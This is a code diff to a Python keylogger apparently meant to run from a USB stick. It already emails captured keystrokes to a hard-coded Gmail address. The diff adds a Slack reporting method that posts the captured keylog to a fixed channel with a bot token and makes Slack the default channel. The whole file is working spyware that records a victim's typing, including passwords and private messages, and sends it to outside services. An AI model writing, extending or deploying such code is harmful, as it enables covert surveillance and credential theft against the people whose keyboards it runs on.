@@ -6,6 +6,15 @@ from threading import Timer # Intended to make it possible to send reports have 
 from datetime import datetime # Imported to retrieve the current date times at certain periods of time
 from email import message # Imported to format emails for sending keylohs
 
+from asyncio.windows_events import NULL
+from email import message
+from slack_sdk import WebClient
+from dotenv import load_dotenv
+import os
+
+load_dotenv()
+SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']
+bot = WebClient(SLACK_BOT_TOKEN)
 
 # Email Variables for report type of emails
 EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
@@ -43,10 +52,13 @@ class UsbKeylogger:
         email.send_message(content, from_addr = address, to_addrs = [address]) # Sends the email 
         email.quit() # Terminates the email server
 
+    def reportSlack(self, postHeader):
+            slackPost = postHeader + "\n" + self.keylog
+            bot.chat_postMessage(channel = "C036JLKMVR6", text = slackPost)
+
+    #def reportText(self):
     #def reportDiscord(self):
     #def reportSkype(self):
-    #def reportSlack(self):
-    #def reportText(self):
 
     def callbackKeyboard(self, event):
         eventName = "[" + event.name + "]"# Create eventName variable
@@ -71,7 +83,9 @@ class UsbKeylogger:
                 self.reportFile() # Calls the reportFile function to create a file for keylog recording
             elif self.reportType == "Email":
                 self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.fileIndentifier) # Calls the reportEmail funciton to sends an email of keylog recording
-           
+            elif self.reportType == "Slack":
+                self.reportSlack(self.fileIndentifier)
+                
             self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
         
         self.keylog = "" # Resets the value of self.keylog to contain nothing
@@ -89,10 +103,10 @@ if __name__ == "__main__":
         """
         Uncomment the report type desired and comment the others
         """
-        usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
+        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
-        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
+        usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Skype")
         usbKeylogger.start()
